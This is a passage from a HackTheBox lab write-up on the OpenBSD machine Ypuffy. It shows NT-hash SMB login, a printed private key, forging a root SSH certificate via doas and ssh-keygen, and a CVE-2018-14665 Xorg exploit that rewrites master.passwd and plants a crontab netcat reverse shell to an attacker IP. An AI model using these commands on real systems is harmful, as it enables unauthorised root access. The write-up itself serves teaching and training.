</pre><td class="rouge-code"><pre><span class="nv">$ </span>smbclient <span class="nt">-L</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-U</span> alice1978 <span class="nt">--pw-nt-hash</span><span class="o">=</span>0B186E661BBDBDCF6047784DE8B9FD8B <span class="nt">-W</span> hackthebox.local
WARNING: no network interfaces found
Enter HACKTHEBOX.LOCAL<span class="se">\a</span>lice1978<span class="s1">'s password:

        Sharename       Type      Comment
        ---------       ----      -------
        alice           Disk      Alice'</span>s Windows Directory
        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>Samba Server<span class="o">)</span>
SMB1 disabled <span class="nt">--</span> no workgroup available
</pre></table></code></div></div><p>Getting data from alice share:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>smbclient //<span class="sb">`</span>IP<span class="sb">`</span>/alice <span class="nt">-U</span> alice1978%0B186E661BBDBDCF6047784DE8B9FD8B <span class="nt">--pw-nt-hash</span>
WARNING: no network interfaces found
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Tue Jul 31 08:24:20 2018
  ..                                  D        0  Wed Aug  1 08:46:50 2018
  my_private_key.ppk                  A     1460  Tue Jul 17 07:08:51 2018

                433262 blocks of size 1024. 411540 blocks available
smb: <span class="se">\&gt;</span> mget <span class="k">*</span>
Get file my_private_key.ppk? y
getting file <span class="se">\m</span>y_private_key.ppk of size 1460 as my_private_key.ppk <span class="o">(</span>4.0 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 4.0 KiloBytes/sec<span class="o">)</span>
smb: <span class="se">\&gt;</span> <span class="nb">exit</span>
</pre></table></code></div></div><h1 id="putty-ppk-to-ssh">PuTTY ppk to SSH</h1><p>Checking what that key is, and it’s a PuTTY private key.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="nv">$ </span>file my_private_key.ppk
my_private_key.ppk: PuTTY Private Key File, version 2, algorithm ssh-rsa, Encryption none <span class="s2">"rsa-key-20180716"</span>
<span class="nv">$ </span><span class="nb">cat </span>my_private_key.ppk
PuTTY-User-Key-File-2: ssh-rsa
Encryption: none
Comment: rsa-key-20180716
Public-Lines: 6
AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz
1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02qux
BoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAj
h7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/Sxa
iA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWx
ivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw<span class="o">==</span>
Private-Lines: 14
AAABAH0knH2xprkuycHoh18sGrlvVGVG6C2vZ9PsiBdP/5wmhpYI3Svnn3ZL8CwF
VGaXdidhZunC9xmD1/QAgCgTz/Fh5yl+nGdeBWc10hLD2SeqFJoHU6SLYpOSViSE
cOZ5mYSy4IIRgPdJKwL6NPnrO+qORSSs9uKVqEdmKLm5lat9dRJVtFlG2tZ7tsma
hRM//9du5MKWWemJlW9PmRGY6shATM3Ow8LojNgnpoHNigB6b/kdDozx6RIf8b1q
Gs+gaU1W5FVehiV6dO2OjHUoUtBME01owBLvwjdV/1Sea/kcZa72TYIMoN1MUEFC
3hlBVcWbiy+O27JzmDzhYen0Jq0AAACBANTBwU1DttMKKphHAN23+tvIAh3rlNG6
m+xeStOxEusrbNL89aEU03FWXIocoQlPiQBr3s8OkgMk1QVYABlH30Y2ZsPL/hp6
l4UVEuHUqnTfEOowVTcVNlwpNM8YLhgn+JIeGpJZqus5JK/pBhK0JclenIpH5M2v
4L9aKFwiMZxfAAAAgQDG+o9xrh+rZuQg8BZ6ZcGGdszZITn797a4YU+NzxjP4jR+
qSVCTRky9uSP0i9H7B9KVnuu9AfzKDBgSH/zxFnJqBTTykM1imjt+y1wVa/3aLPh
hKxePlIrP3YaMKd38ss2ebeqWy+XJYwgWOsSw8wAQT7fIxmT8OYfJRjRGTS74QAA
AIEAiOHSABguzA8sMxaHMvWu16F0RKXLOy+S3ZbMrQZr+nDyzHYPaLDRtNE2iI5c
QLr38t6CRO6zEZ+08Zh5rbqLJ1n8i/q0Pv+nYoYlocxw3qodwUlUYcr1/sE+Wuvl
xTwgKNIb9U6L6OdSr5FGkFBCFldtZ/WSHtbHxBabb0zpdts<span class="o">=</span>
Private-MAC: 208b4e256cd56d59f70e3594f4e2c3ca91a757c9
</pre></table></code></div></div><p>Converting PuTTY key to SSH private key:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>puttygen my_private_key.ppk <span class="nt">-O</span> private-openssh <span class="nt">-o</span> id_rsa
</pre></table></code></div></div><p>Logging in as <code class="language-plaintext highlighter-rouge">alice1978</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="nv">$ </span>m
OpenBSD 6.3 <span class="o">(</span>GENERIC<span class="o">)</span> <span class="c">#100: Sat Mar 24 14:17:45 MDT 2018</span>

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug<span class="o">(</span>1<span class="o">)</span> utility to report bugs <span class="k">in </span>the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and <span class="k">if </span>a
known fix <span class="k">for </span>it exists, include that as well.

ypuffy<span class="nv">$ </span><span class="nb">whoami
</span>alice1978
</pre></table></code></div></div><h1 id="privesc-via-ssh-ca-authentication">Privesc via SSH CA authentication</h1><h2 id="postgresql">PostgreSQL</h2><p>Checking for open ports, I’ve one for <code class="language-plaintext highlighter-rouge">postgresql</code> server:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>ypuffy<span class="nv">$ </span>netstat <span class="nt">-l</span> <span class="nt">-p</span> tcp
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto   Recv-Q Send-Q  Local Address          Foreign Address        <span class="o">(</span>state<span class="o">)</span>
tcp          0      0  <span class="k">*</span>.microsof             <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp          0      0  localhost.postgres     <span class="k">*</span>.<span class="k">*</span>                    LISTEN
tcp          0      0  <span class="k">*</span>.www                  <span class="k">*</span>.<span class="k">*</span>                    LISTEN
</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>ypuffy<span class="nv">$ </span>netstat <span class="nt">-lu</span>
Active UNIX domain sockets
Address            Type   Recv-Q Send-Q              Inode               Conn               Refs            Nextref Addr
               0x0 stream      0      0                0x0                0x0                0x0                0x0
               0x0 stream      0      0                0x0                0x0                0x0                0x0 /var/run/cron.sock
               0x0 stream      0      0                0x0                0x0                0x0                0x0
               0x0 stream      0      0                0x0                0x0                0x0                0x0
               0x0 stream      0      0                0x0                0x0                0x0                0x0
               0x0 stream      0      0                0x0                0x0                0x0                0x0
               0x0 stream      0      0                0x0                0x0                0x0                0x0
               0x0 stream      0      0                0x0                0x0                0x0                0x0
               0x0 stream      0      0                0x0                0x0                0x0                0x0
               0x0 stream      0      0                0x0                0x0                0x0                0x0
               0x0 stream      0      0                0x0                0x0                0x0                0x0 /var/www/run/wsgi/sshauthd.socket
               0x0 stream      0      0                0x0                0x0                0x0                0x0 /tmp/.s.PGSQL.5432
               0x0 stream      0      0                0x0                0x0                0x0                0x0 /var/run/samba/nmbd/unexpected
</pre></table></code></div></div><p>User <code class="language-plaintext highlighter-rouge">bob8791</code> has a weird file named <code class="language-plaintext highlighter-rouge">sshauth.sql</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>ypuffy<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home/bob8791/dba
total 12
drwxr-xr-x  2 bob8791  bob8791  512 Jul 30  2018 <span class="nb">.</span>
drwxr-xr-x  3 bob8791  bob8791  512 Jul 30  2018 ..
<span class="nt">-rw-r--r--</span>  1 bob8791  bob8791  268 Jul 30  2018 sshauth.sql
</pre></table></code></div></div><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">principals</span> <span class="p">(</span>
        <span class="n">uid</span> <span class="nb">text</span><span class="p">,</span>
        <span class="n">client</span> <span class="n">cidr</span><span class="p">,</span>
        <span class="n">principal</span> <span class="nb">text</span><span class="p">,</span>
        <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">uid</span><span class="p">,</span><span class="n">client</span><span class="p">,</span><span class="n">principal</span><span class="p">)</span>
<span class="p">);</span><span class="o">****</span>

<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">keys</span> <span class="p">(</span>
        <span class="n">uid</span> <span class="nb">text</span><span class="p">,</span>
        <span class="k">key</span> <span class="nb">text</span><span class="p">,</span>
        <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">uid</span><span class="p">,</span><span class="k">key</span><span class="p">)</span>
<span class="p">);</span>
<span class="k">grant</span> <span class="k">select</span> <span class="k">on</span> <span class="n">principals</span><span class="p">,</span><span class="n">keys</span> <span class="k">to</span> <span class="n">appsrv</span><span class="p">;</span>
</pre></table></code></div></div><p>I couldn’t login to <code class="language-plaintext highlighter-rouge">postgresql</code> server using the default creds <code class="language-plaintext highlighter-rouge">postgres:postgres</code> with <code class="language-plaintext highlighter-rouge">psql</code>.</p><h2 id="doas">doas</h2><p>If I run <code class="language-plaintext highlighter-rouge">doas</code>, <code class="language-plaintext highlighter-rouge">sudo</code> in openbsd, it shows nothing.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ypuffy<span class="nv">$ </span>doas <span class="nt">-L</span>
ypuffy<span class="err">$</span>
</pre></table></code></div></div><p>Let’s check the config file for doas:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>ypuffy<span class="nv">$ </span><span class="nb">cat</span> /etc/doas.conf
permit keepenv :wheel
permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
</pre></table></code></div></div><p>So, it gives nopass ssh-keygen execution as userca for alice1978.</p><h2 id="getting-ca-principal-for-root">Getting CA principal for root</h2><p>Let’s check SSH config files:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>ypuffy<span class="nv">$ </span><span class="nb">cat</span> /etc/ssh/sshd_config | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s1">'#'</span>

PermitRootLogin prohibit-password
AuthorizedKeysFile      .ssh/authorized_keys
AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type<span class="o">=</span>keys&amp;username<span class="o">=</span>%u
AuthorizedKeysCommandUser nobody
TrustedUserCAKeys /home/userca/ca.pub
AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type<span class="o">=</span>principals&amp;username<span class="o">=</span>%u
AuthorizedPrincipalsCommandUser nobody
PasswordAuthentication no
ChallengeResponseAuthentication no
AllowAgentForwarding no
AllowTcpForwarding no
X11Forwarding no
Subsystem       sftp    /usr/libexec/sftp-server
</pre></table></code></div></div><p>There are 2 curl commands that are interesting, let’s use them.</p><p>This is integrated with the postgresql server running. With <code class="language-plaintext highlighter-rouge">type=keys</code>, I can list my SSH-public key.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>ypuffy<span class="nv">$ </span>curl <span class="s1">'http://127.0.0.1/sshauth?type=keys&amp;username=alice1978'</span>
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw<span class="o">==</span> rsa-key-20180716
ypuffy<span class="nv">$ </span>curl <span class="s1">'http://127.0.0.1/sshauth?type=keys&amp;username=bob8791'</span>
ypuffy<span class="nv">$ </span>curl <span class="s1">'http://127.0.0.1/sshauth?type=keys&amp;username=root'</span>
</pre></table></code></div></div><p>With <code class="language-plaintext highlighter-rouge">type=principals</code>, I can get the principal for root: <code class="language-plaintext highlighter-rouge">3m3rgencyB4ckd00r</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>ypuffy<span class="nv">$ </span>curl <span class="s1">'http://127.0.0.1/sshauth?type=principals&amp;username=root'</span>
3m3rgencyB4ckd00r
ypuffy<span class="nv">$ </span>curl <span class="s1">'http://127.0.0.1/sshauth?type=principals&amp;username=alice1978'</span>
alice1978
ypuffy<span class="nv">$ </span>curl <span class="s1">'http://127.0.0.1/sshauth?type=principals&amp;username=bob8791'</span>
bob8791
</pre></table></code></div></div><h2 id="doas-for-ssh-with-ca">doas for SSH with CA</h2><p>So, I’ll generate SSH keys for root as user <code class="language-plaintext highlighter-rouge">userca</code>, who manages all the SSH-CA authenticated keys. If I generate a SSH-key pair and set the public key for root with that pair, I can easily get root as I’ve the private key.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>doas <span class="nt">-u</span> userca /usr/bin/ssh-keygen
</pre></table></code></div></div><p>Above command needs some extra flags for CA authentication.</p><blockquote><p>If I google “<em>ssh ca authentication</em>”: <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sec-creating_ssh_ca_certificate_signing-keys">access.redhat.com/documentation/……./creating_ssh_ca_certificate_signing-keys</a> I get - <code class="language-plaintext highlighter-rouge">ssh-keygen -s ca_host_key -I certificate_ID -h ssh_host_rsa_key.pub</code></p></blockquote><p>or</p><p>I do <code class="language-plaintext highlighter-rouge">ssh-keygen --help</code>:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>ssh-keygen <span class="nt">-I</span> certificate_identity <span class="nt">-s</span> ca_key <span class="o">[</span><span class="nt">-hU</span><span class="o">]</span> <span class="o">[</span><span class="nt">-D</span> pkcs11_provider]
                  <span class="o">[</span><span class="nt">-n</span> principals] <span class="o">[</span><span class="nt">-O</span> option] <span class="o">[</span><span class="nt">-V</span> validity_interval]
                  <span class="o">[</span><span class="nt">-z</span> serial_number] file ...
</pre></table></code></div></div><p>So, this command requires a public file at the end. (Says just file in the help, but the article mentions SSH public key)</p><ul><li>Generating a SSH-key pair:<div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>ypuffy<span class="nv">$ </span>ssh-keygen
Generating public/private rsa key pair.
Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/home/alice1978/.ssh/id_rsa<span class="o">)</span>: /tmp/id_rsa
Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>:
Enter same passphrase again:
Your identification has been saved <span class="k">in</span> /tmp/id_rsa.
Your public key has been saved <span class="k">in</span> /tmp/id_rsa.pub.
The key fingerprint is:
SHA256:zHdJX37Q3tKAg9K1J/VipnyESQcxAGf1fKKDxHLzmtM alice1978@ypuffy.hackthebox.htb
The key<span class="s1">'s randomart image is:
+---[RSA 2048]----+
|        ..+oBoo  |
|         = + @ o |
|        o B O % =|
|       o = * % @.|
|        S o O + *|
|         . = o ..|
|          + E    |
|           .     |
|                 |
+----[SHA256]-----+
ypuffy$ ls
id_rsa     id_rsa.pub 
</span></pre></table></code></div></div></li><li>Running <code class="language-plaintext highlighter-rouge">doas</code>: SSH-keygen for CA authentication requires: <code class="language-plaintext highlighter-rouge">-I</code> - Certificate ID for the user (Can keep anything for now, In a working environment, they could use this to track who was assigned a given cert.) <code class="language-plaintext highlighter-rouge">-s</code> - Specifies that I want to sign a public key using the given CA private key. <code class="language-plaintext highlighter-rouge">-n</code> - The principles to be included in the certificate. <code class="language-plaintext highlighter-rouge">/tmp/id_rsa.pub</code> - The public key that will be associated with the certificate.</li></ul><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ypuffy<span class="nv">$ </span>doas <span class="nt">-u</span> userca /usr/bin/ssh-keygen <span class="nt">-I</span> root <span class="nt">-s</span> /home/userca/ca <span class="nt">-n</span> 3m3rgencyB4ckd00r /tmp/id_rsa.pub
Signed user key /tmp/id_rsa-cert.pub: <span class="nb">id</span> <span class="s2">"root"</span> serial 0 <span class="k">for </span>3m3rgencyB4ckd00r valid forever
</pre></table></code></div></div><p>Now, you can just login with the <code class="language-plaintext highlighter-rouge">id_rsa</code>, you earlier generated:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>ypuffy<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa root@localhost
OpenBSD 6.3 <span class="o">(</span>GENERIC<span class="o">)</span> <span class="c">#100: Sat Mar 24 14:17:45 MDT 2018</span>

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug<span class="o">(</span>1<span class="o">)</span> utility to report bugs <span class="k">in </span>the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and <span class="k">if </span>a
known fix <span class="k">for </span>it exists, include that as well.

ypuffy# <span class="nb">whoami
</span>root
ypuffy# <span class="nb">cat</span> /root/root.txt
1265f8e0a1984edd9dc1b6c3fcd1757f
</pre></table></code></div></div><h1 id="privesc-via-xorg-x11-server">Privesc via Xorg-x11-server</h1><p>You can get this by simply finding exploits for OpenBSD 6.3.</p><blockquote><p>Google “openbsd 6.3 privilege escalation” <a href="https://www.exploit-db.com/exploits/45742">https://www.exploit-db.com/exploits/45742</a></p></blockquote><p>or</p><p>If I check for SUID’s present on ypuffy, I’ll see Xorg-x11:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>ypuffy<span class="nv">$ </span>find / <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
/usr/bin/chfn
/usr/bin/chpass
/usr/bin/chsh
/usr/bin/doas
/usr/bin/lpr
/usr/bin/lprm
/usr/bin/passwd
/usr/bin/su
/usr/libexec/lockspool
/usr/libexec/ssh-keysign
/usr/local/bin/pwned
/usr/local/libexec/dbus-daemon-launch-helper
/usr/sbin/authpf
/usr/sbin/authpf-noip
/usr/sbin/pppd
/usr/sbin/traceroute
/usr/sbin/traceroute6
/usr/X11R6/bin/Xorg
/sbin/ping
/sbin/ping6
/sbin/shutdown
</pre></table></code></div></div><p>The xorg-x11-server package on the system suffers from a root privilege escalation vulnerability (CVE-2018-14665).</p><p>Also there are 2 exploits in exploit-db for a single CVE. Named <code class="language-plaintext highlighter-rouge">xorg-x11-server &lt; 1.20.3 - Local Privilege Escalation</code> and <code class="language-plaintext highlighter-rouge">xorg-x11-server 1.20.3 - Privilege Escalation</code>.</p><p>If I check my <code class="language-plaintext highlighter-rouge">Xorg</code> version, it’s <code class="language-plaintext highlighter-rouge">1.19.6</code> &lt; 1.20.3.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>ypuffy<span class="nv">$ </span>Xorg <span class="nt">-version</span>

X.Org X Server 1.19.6
Release Date: 2017-12-20
X Protocol Version 11, Revision 0
Build Operating System: OpenBSD 6.3 amd64
Current Operating System: OpenBSD ypuffy.hackthebox.htb 6.3 GENERIC#100 amd64
Build Date: 24 March 2018  02:38:24PM

Current version of pixman: 0.34.0
        Before reporting problems, check http://wiki.x.org
        to make sure that you have the latest version.
</pre></table></code></div></div><p>Using <a href="https://www.exploit-db.com/exploits/45697">https://www.exploit-db.com/exploits/45697</a>:</p><p>The exploit tries to overwrite data in <code class="language-plaintext highlighter-rouge">master.passwd</code> and change the password to <code class="language-plaintext highlighter-rouge">Password1</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>Xorg <span class="nt">-fp</span> <span class="s1">'root:$2b$08$As7rA9IO2lsfSyb7OkESWueQFzgbDfCXw0JXjjYszKa8Aklt5RTSG:0:0:daemon:0:0:Charlie &amp;:/root:/bin/ksh'</span> <span class="nt">-logfile</span> master.passwd :1 &amp;
</pre></table></code></div></div><p>I’ll overwrite /etc/crontab and get a shell.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cd</span> /etc
<span class="nv">$ </span>Xorg <span class="nt">-fp</span> <span class="s2">"* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.26 4444 &gt; /tmp/f"</span> <span class="nt">-logfile</span> crontab :1 &amp;
<span class="nv">$ </span><span class="nb">cat</span> /etc/crontab
<span class="o">[</span>   668.598] <span class="o">(==)</span> Automatically adding devices
<span class="o">[</span>   668.598] <span class="o">(==)</span> Automatically enabling devices
<span class="o">[</span>   668.598] <span class="o">(==)</span> Not automatically adding GPU devices
<span class="o">[</span>   668.598] <span class="o">(==)</span> Max clients allowed: 256, resource mask: 0x1fffff
<span class="o">[</span>   668.598] <span class="o">(</span>++<span class="o">)</span> FontPath <span class="nb">set </span>to:
        <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> root <span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 10.10.14.26 4444 <span class="o">&gt;</span> /tmp/f
<span class="o">[</span>   668.598] <span class="o">(==)</span> ModulePath <span class="nb">set </span>to <span class="s2">"/usr/X11R6/lib/modules"</span>
<span class="o">[</span>   668.598] <span class="o">(</span>II<span class="o">)</span> The server relies on wscons to provide the list of input devices.
        If no devices become available, reconfigure wscons or disable AutoAddDevices.
</pre></table></code></div></div><p>I get a rev-shell back as root.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.26] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.107] 24626
/bin/sh: No controlling <span class="nb">tty</span> <span class="o">(</span>open /dev/tty: Device not configured<span class="o">)</span>
/bin/sh: Can<span class="s1">'t find tty file descriptor
/bin/sh: warning: won'</span>t have full job control
ypuffy# <span class="nb">whoami
</span>root
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/other-machines/'>Other Machines</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/openbsd/" class="post-tag no-text-decoration" >openbsd</a> <a href="/tags/ldap/" class="post-tag no-text-decoration" >ldap</a> <a href="/tags/ssh-ca-auth/" class="post-tag no-text-decoration" >ssh-ca-auth</a> <a href="/tags/certificate/" class="post-tag no-text-decoration" >certificate</a> <a href="/tags/doas/" class="post-tag no-text-decoration" >doas</a> <a href="/tags/xorg/" class="post-tag no-text-decoration" >xorg</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Ypuffy - TheCaretaker&url=https://0xcaretaker.github.io/posts/Ypuffy/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Ypuffy - TheCaretaker&u=https://0xcaretaker.github.io/posts/Ypuffy/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Ypuffy - TheCaretaker&url=https://0xcaretaker.github.io/posts/Ypuffy/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Vault/">Vault</a></li><li><a href="/posts/Knife/">Knife</a></li><li><a href="/posts/Ypuffy/">Ypuffy</a></li><li><a href="/posts/Giddy/">Giddy</a></li><li><a href="/posts/Love/">Love</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer overflow</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/wordpress/">wordpress</a> <a class="post-tag" href="/tags/sql-injection/">sql injection</a> <a class="post-tag" href="/tags/return-to-libc/">return to libc</a> <a class="post-tag" href="/tags/powershell/">powershell</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/pivoting/">pivoting</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 